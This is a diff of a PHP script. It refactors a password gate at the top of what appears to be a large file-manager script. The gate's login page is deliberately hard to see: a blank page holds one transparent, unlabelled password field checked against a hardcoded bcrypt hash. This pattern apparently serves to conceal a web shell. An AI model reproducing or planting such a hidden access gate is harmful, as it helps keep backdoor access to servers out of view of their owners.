@@ -1,56 +1,37 @@
 <?php
 session_start();
 date_default_timezone_set("Asia/Jakarta");
-
-function show_login_page() {
+function login_page() {
 ?>
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-  body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: flex-start;
-            align-items: flex-end;
-        }
-        form {
-            margin: 10px;
-        }
-        input {
-            border: none;
-            outline: none;
-            background: transparent;
-        }
-        input:focus {
-            border: none;
-        }
-        @media (prefers-color-scheme: dark) {
-            body { background-color: #000 !important; }
-        }
+        body { margin: 0; padding: 0; height: 100vh; display: flex; justify-content: flex-start; align-items: flex-end; }
+        form { margin: 10px; }
+        input { border: none; outline: none; background: transparent; }
+        input:focus { border: none; }
+        @media (prefers-color-scheme: white) { body { background-color: #000 !important; } }
     </style>
 </head>
 <body>
-            <form method="POST">
-                <input type="password" id="password" name="pass" placeholder="">
-            </form>
+    <form method="POST">
+        <input type="password" name="pass" placeholder="">
+    </form>
 </body>
 </html>
 <?php
     exit;
 }
+if (!isset($_SESSION['auth'])) {
+    $shp = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG';
 
-if (!isset($_SESSION['authenticated'])) {
-    $stored_hashed_password = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG';
-
-    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
-        $_SESSION['authenticated'] = true;
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $shp)) {
+        $_SESSION['auth'] = true;
     } else {
-        show_login_page();
+        login_page();
     }
 }
 ?>
@@ -8682,3 +8663,4 @@ function get_base64_file(){
 }
 fb_log("Page generated in ".number_format((getmicrotime()-$script_init_time), 3, '.', '')."s (limit ".ini_get("max_execution_time")."s) using ".format_size(memory_get_usage())." (limit ".ini_get("memory_limit").")");
 ?>
+
